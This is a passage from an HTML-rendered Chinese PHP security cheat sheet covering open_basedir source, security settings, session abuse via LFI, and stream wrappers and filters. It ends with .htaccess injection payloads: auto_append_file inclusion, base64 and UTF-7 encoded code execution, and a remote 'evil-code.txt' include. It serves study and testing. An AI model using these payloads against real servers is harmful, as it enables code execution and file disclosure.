27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">pathbuf</span> <span class="cm-operator">=</span> <span class="cm-variable">estrdup</span>(<span class="cm-variable">PG</span>(<span class="cm-variable">open_basedir</span>));</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">ptr</span> <span class="cm-operator">=</span> <span class="cm-variable">pathbuf</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">while</span> (<span class="cm-variable">ptr</span> <span class="cm-operator">&amp;&amp;</span> <span class="cm-operator">*</span><span class="cm-variable">ptr</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-tab" role="presentation" cm-text="	">   </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-builtin">end</span> <span class="cm-operator">=</span> <span class="cm-builtin">strchr</span>(<span class="cm-variable">ptr</span>, <span class="cm-variable">DEFAULT_DIR_SEPARATOR</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">if</span> (<span class="cm-builtin">end</span> <span class="cm-operator">!=</span> <span class="cm-atom">NULL</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-operator">*</span><span class="cm-builtin">end</span> <span class="cm-operator">=</span> <span class="cm-string">'\0'</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-builtin">end</span><span class="cm-operator">++</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">if</span> (<span class="cm-variable">php_check_specific_open_basedir</span>(<span class="cm-variable">ptr</span>, <span class="cm-variable">path</span>) <span class="cm-operator">==</span> <span class="cm-number">0</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">efree</span>(<span class="cm-variable">pathbuf</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">25</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span> <span class="cm-number">0</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">26</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">27</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">ptr</span> <span class="cm-operator">=</span> <span class="cm-builtin">end</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">28</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">29</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">if</span> (<span class="cm-variable">warn</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">30</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">php_error_docref</span>(<span class="cm-atom">NULL</span>, <span class="cm-variable">E_WARNING</span>, <span class="cm-string">"open_basedir restriction in effect. File(%s) is not within the allowed path(s): (%s)"</span>, <span class="cm-variable">path</span>, <span class="cm-variable">PG</span>(<span class="cm-variable">open_basedir</span>));</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">31</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">32</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">efree</span>(<span class="cm-variable">pathbuf</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">33</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">errno</span> <span class="cm-operator">=</span> <span class="cm-variable">EPERM</span>; <span class="cm-comment">/* we deny permission to open it */</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">34</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span> <span class="cm-operator">-</span><span class="cm-number">1</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">35</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">36</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-comment">/* Nothing to check... */</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">37</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span> <span class="cm-number">0</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">38</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 929px;"></div><div class="CodeMirror-gutters" style="height: 929px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre></blockquote><h3 id='安全相关配置'><span>安全相关配置</span></h3><h4 id='函数与类限制'><span>函数与类限制</span></h4><blockquote><p><span>可通过 disable_functions / disable_classes 限制 PHP 可调用的函数和类。</span></p></blockquote><h4 id='目录访问限制'><span>目录访问限制</span></h4><blockquote><p><span>可通过 open_basedir 限制 PHP 可访问的目录。</span></p></blockquote><h4 id='远程引用限制'><span>远程引用限制</span></h4><blockquote><p><span>可通过 all_url_include 限制远程文件包含，默认关闭。可通过 allow_url_fopen 限制打开远程文件，默认开启。</span></p></blockquote><h4 id='session-2'><span>Session</span></h4><h5 id='sessionsave'><span>Session.Save</span></h5><blockquote><p><span>PHP 的 Session 默认 handler 为文件，存储在 php.ini 的 session.save_path 中，若有任意读写文件的权限，则可修改或读取 session。从 phpinfo 中可获得 session 位置。</span></p></blockquote><h5 id='sessionupload'><span>Session.Upload</span></h5><blockquote><p><span>PHP 默认开启了 session.upload_progress.enabled ，该选项会导致生成上传进度文件，其存储路径可以在 phpinfo 中获取。</span></p><p><span>那么可以构造特别的报文向服务器发送，在有 LFI 的情况下即可利用。</span></p></blockquote><h3 id='php-流'><span>PHP 流</span></h3><h4 id='简介-14'><span>简介</span></h4><blockquote><p><span>流（Streams）的概念是在 php 4.3 引入的，是对流式数据的抽象，用于统一数据操作，比如文件数据、网络数据、压缩数据等。</span></p><p><span>流可以通过 file、open、fwrite、fclose、file_get_contents、file_put_contents 等函数操作。</span></p></blockquote><h4 id='封装协议'><span>封装协议</span></h4><blockquote><p><span>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、copy()、file_exists() 和 filesize() 的文件系统函数。支持的协议可用 stream_get_wrappers() 查看。</span></p></blockquote><ul><li><span>file:// 访问本地文件系统</span></li><li><span>http:// 访问 HTTP(s) 网址</span></li><li><span>ftp:// 访问 FTP(s) URLs</span></li><li><span>php:// 访问各个输入/输出流（I/O streams）</span></li><li><span>zlib:// 压缩流</span></li><li><span>data:// 数据（RFC 2397）</span></li><li><span>glob:// 查找匹配的文件路径模式</span></li><li><span>phar:// PHP 归档</span></li><li><span>ssh2:// Secure Shell 2</span></li><li><span>rar:// RAR</span></li><li><span>ogg:// 音频流</span></li><li><span>expect:// 处理交互式的流</span></li></ul><h4 id='php-支持流'><span>PHP 支持流</span></h4><blockquote><p><span>PHP 提供了一些输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span></p><p><span>需要注意的是，流不受 allow_url_fopen 限制，但是 php://input、php://stdin、php://memory 和 php:/</span></p><p><span>/temp 受限于 allow_url_include 。</span></p></blockquote><h4 id='输入输出流'><span>输入输出流</span></h4><blockquote><p><span>php://stdin 、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。数据流引用了复制的文件描述符，所以如果在打开 php://stdin 并在之后关了它，仅是关闭了复制品，真正被引用的 STDIN 并不受影响。</span></p><p><span>其中 php://stdin 是只读的，php://stdout 和 php://stderr 是只写的。</span></p></blockquote><h4 id='fd'><span>fd</span></h4><blockquote><p><span>php://fd 允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。</span></p></blockquote><h4 id='memory-与-temp'><span>memory 与 temp</span></h4><blockquote><p><span>php://memory 和 php://temp 是一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</span></p><p><span>php://temp 的内存限制可通过添加 /maxmemory:NN 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</span></p></blockquote><h4 id='input'><span>input</span></h4><blockquote><p><span>php://input 是个可以访问请求的原始数据的只读流。POST 请求的情况下，最好使用 php://input 来代替</span></p><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>$</span><span>HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。而 ，这样的情况下 </span><span>$</span><span>HTTP_RAW_POST_DATA默认没有填充，比激活 always_populate_raw_post_data 潜在需要更少的内存。enctype=</span><span>&quot;</span><span>multipart/ form-data</span><span>&quot;</span><span> 的时候 php://input 是无效的。</span></p></blockquote><h4 id='filter'><span>filter</span></h4><blockquote><p><span>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。PHP 默认提供了一些流过滤器，除此之外，还可以使用各种自定义过滤器。</span></p><p><span>filter 有 resource, read, write 三个参数，resource 参数是必须的。它指定了你要筛选过滤的数据流。read 和</span></p><p><span>write 是可选参数，可以设定一个或多个过滤器名称，以管道符（</span><span>|</span><span>）分隔。</span></p></blockquote><h4 id='过滤器列表'><span>过滤器列表</span></h4><blockquote><p><span>可以通过 stream_get_filters() 获取已经注册的过滤器列表。其中 PHP 内置的过滤器如下：</span></p></blockquote><ul><li><h5 id='字符串过滤器'><span>字符串过滤器</span></h5><ul><li><span>string.rot13</span></li><li><span>string.toupper</span></li><li><span>string.tolower</span></li><li><span>string.strip_tags</span></li></ul></li><li><h5 id='转换过滤器'><span>转换过滤器</span></h5><ul><li><span>convert.base64-encode</span></li><li><span>convert.base64-decode</span></li><li><span>convert.quoted-printable-encode</span></li><li><span>convert.quoted-printable-decode</span></li><li><span>convert.iconv.</span><span>*</span></li></ul></li><li><h5 id='压缩过滤器'><span>压缩过滤器</span></h5><ul><li><span>zlib.deflate</span></li><li><span>zlib.inflate</span></li><li><span>bzip2.compress</span></li><li><span>bzip2.decompress</span></li></ul></li><li><h5 id='加密过滤器'><span>加密过滤器</span></h5><ul><li><span>mcrypt.</span>’’<span>ciphername</span>’’</li><li><span>mdecrypt.</span>’’<span>ciphername</span>’’</li></ul></li></ul><h4 id='过滤器利用-tricks'><span>过滤器利用 tricks</span></h4><ul><li><h5 id='lfi-1'><span>LFI</span></h5><ul><li><span>php://filter/convert.base64-encode/resource=index.php</span></li></ul></li><li><p><span>XXE 读取文件时会因而解析报错，可用 base64 编码</span></p></li><li><p><span>base64 编码会弃掉未在码表内的字符，可用于绕过一些文件格式</span></p></li><li><p><span>部分 convert 会有大量的资源消耗，可用作 DoS</span></p></li><li><p><span>rot13 / convert 转换过 WAF</span></p></li></ul><h3 id='htaccess-injection-payload'><span>htaccess injection payload</span></h3><h4 id='file-inclusion-1'><span>file inclusion</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">php_value</span> <span class="cm-variable">auto_append_file</span> <span class="cm-operator">/</span><span class="cm-variable">etc</span><span class="cm-operator">/</span><span class="cm-variable">hosts</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='code-execution'><span>code execution</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">php_value</span> <span class="cm-variable">auto_append_file</span> .<span class="cm-variable">htaccess</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#&lt;?php phpinfo();</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='file-inclusion-2'><span>file inclusion</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>4</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">php_flag</span> <span class="cm-variable">allow_url_include</span> <span class="cm-number">1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">php_value</span> <span class="cm-variable">auto_append_file</span> <span class="cm-variable">data</span>:<span class="cm-comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#php_value auto_append_file https://sektioneins.de/evil-code.txt</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 91px;"></div><div class="CodeMirror-gutters" style="height: 91px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='code-execution-with-utf-7'><span>code execution with UTF-7</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>4</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">php_flag</span> <span class="cm-variable">zend</span>.<span class="cm-variable">multibyte</span> <span class="cm-number">1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">php_value</span> <span class="cm-variable">zend</span>.<span class="cm-variable">script_encoding</span> <span class="cm-string">"UTF-7"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">php_value</span> <span class="cm-variable">auto_append_file</span> .<span class="cm-variable">htaccess</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#+ADw?php phpinfo()+ADs</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 91px;"></div><div class="CodeMirror-gutters" style="height: 91px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='source-code-disclosure'><span>Source code disclosure</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" 